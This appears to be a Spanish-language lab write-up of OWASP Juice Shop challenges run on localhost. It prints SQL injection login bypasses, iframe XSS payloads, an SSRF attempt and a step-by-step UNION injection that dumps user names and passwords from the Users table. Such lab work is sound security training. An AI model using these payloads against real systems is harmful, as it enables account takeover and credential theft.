## Acceder a la cuenta del Admin gracias a una inyeccion SQL

Es uno de los primeros retos, consiste en loguearse en la cuenta del admin con una inyeccion sql básica.

Explicación -> la inyeccion consiste en poner en el panel de login, **' or 1=1-- -** que dice lo siguiente. 
*O el usuario es 'texto vacío' (NO) O 1=1 (SI)* Como es un OR, se da por vaĺido con que una de esas afirmaciones sea verdad (1=1).

Así que entramos a la cuenta del Admin porque esta inyeccion opera con el id de usaurio 1, que suele corresponder al admin
> Un id  es un índice en una tabla sql que corresponde a cada entrada, normalmente el administrador es el primero que se añade asi que tiene un 1.

------------------------------------------------------------------------

## Inyeccion XSS de Iframe

Un ataque XSS es inyectar código a un panel de javascript, resultando en que la web lo asimila como propio e interprete.
Este se suele probar por tanto con paneles, en este caso el más visible es el de "Search". probé la clásica
```<script> alert("XSS") </script>``` que crea una ventana emergente, no funciónó pero en la "scoreboard" ponía el que si funcianaría
```<iframe src="javascript:alert('XSS')">``` que es muy similar al "script src" tiene mucho sentido ya que la web carga un iframe todo el rato (si haces curl ves 
el código de este y no de su contenido)

Tambien, probé a intentar un ataque SSRF aprovechandome de este panel, un SSRF es hacer que el servidor mande una consulta a sí mismo, revelando
datos confidenciales. Como tira contra el localhost, cree un servidor con python ```sudo python -m http.server 80``` quedó la petición asi 
```<iframe src="http://127.0.0.1:8080">``` Haciendome un directory listing o filtrado de carpetas de mi porpio servidor.

Otras cosas que probé fue cargar de mi direccion un index.html con una reverse shell, pero el sistema me lo mostraba sin interpretarlo. Tampoco
funcionço un LFI al /etc/password local. Aun así tenemos un punto interesante para hacer consultas que pueda derivar de un SSRF (o consultas desde
el propio servidor)

------------------------------------------------------------------------

## Loguearse como Bender

Para registrarse como el usaurio "bender@juice-sh.op" se utiliza una inyeccion sql simple, similar a la que usamos para el admin,
```bender@juice-sh.op'-- -``` Lo que hace es cerrar la query email='bender@juice-sh.op' y comentar el resto para que ignore que hemos puesto
mal la contraseña.

------------------------------------------------------------------------

## SQLi a endpoint oculto

En el panel de busqueda de producto, probé una sqli, lo tipico de '  pero no funcionaba. Resulta que este ```"http://localhost:3000/#/search?q="```
no es el endpoint verdadero al que le hace la petición...
Cuando analizamos en "Red" la peticion (con ctrol derecho inspeccionar), vamos una petición GET a search?q= y le damos a abrir en una pestaña nueva 
nos sale ```"http://localhost:3000/rest/products/search?q="```, siendo este vulnerable (por algo estaba escondido). Si sigue sin salir, recarga la página hasta ver
"/search?q"

**INYECCION**
```
# http://localhost:3000/rest/products/search?q='-- -    -> SQLite ERROR "incomplete input".
```
Dicho error se produce porque faltan parentesis asi que la query es algo como "SELECT * from 'tabla' where id=('nombre')", pero con un 
parentesis sigue dando error, asi que hay que poner dos. Nos filtra toda la tabla de productos. 
Si hacemos ctrl f para buscar "Crhistmas" obtenemos el id=10 que es el producto retirado navideño.

En el endpoint "/api/BasketItems" ponemos el id de producto 10 y le damos a hacer el pedido (siguiendo todos los pasos) nos dará el logro.

------------------------------------------------------------------------

## Filtrar toda la Databse

Primero tenemos que averiguar el numero de columnas
```
# http://localhost:3000/rest/products/search?q=search?q=')) order by 10-- -  Error number of columns
# http://localhost:3000/rest/products/search?q=search?q=')) order by 9-- - No error, o sea hay 9 columnas en la tabla en uso.
```

Si fuera un Maraidb la tabla maestra (tiene unformación sobre todas las tablas del servidor) seria "information_schema", 
pero en sqlite es "sqlite_master"-

```
# http://localhost:3000/rest/products/search?q=search?q=cucuxii')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master-- -
```
He puesto lo de cucuxii porque en productos no existe y solo nos mostrará la parte de sql_master, quitando todo el "ruido"
Para ver las bases de datos...
```
# http://localhost:3000/rest/products/search?q=search?q=cucuxii')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master-- -
```
Nos dice que hay una tabla users, y que entre otros, estan los campos "id", "username", "password"
Asi que...
```
# http://localhost:3000/rest/products/search?q=cucuxii')) UNION SELECT id,username,password,4,5,6,7,8,9 FROM Users-- -
```



